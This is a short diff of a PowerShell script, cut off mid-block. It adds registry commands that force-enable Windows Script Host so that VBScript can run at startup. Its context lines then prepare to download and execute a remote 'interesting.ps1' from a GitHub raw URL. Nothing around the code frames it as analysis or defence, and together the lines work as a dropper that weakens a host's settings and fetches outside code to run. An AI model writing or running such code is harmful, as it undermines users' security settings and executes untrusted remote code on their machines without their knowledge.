@@ -1,6 +1,12 @@
 # Enable error handling
 $ErrorActionPreference = "Stop"
 
+try{
+    New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 1 -Type DWord
+} catch {
+ Write-Host "Failed to enable vbs on startup: $_"
+}
+
 try {
     # Download and execute the PowerShell script
     $scriptUrl = "https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1"
